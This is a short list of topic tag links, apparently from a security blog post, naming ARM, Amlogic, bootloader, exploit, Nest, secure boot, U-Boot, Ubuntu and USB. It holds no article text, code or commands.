[arm](https://fredericb.info/tag/arm.html) [amlogic](https://fredericb.info/tag/amlogic.html) [bootloader](https://fredericb.info/tag/bootloader.html) [exploit](https://fredericb.info/tag/exploit.html) [nest](https://fredericb.info/tag/nest.html) [secureboot](https://fredericb.info/tag/secureboot.html) [uboot](https://fredericb.info/tag/uboot.html) [ubuntu](https://fredericb.info/tag/ubuntu.html) [usb](https://fredericb.info/tag/usb.html)
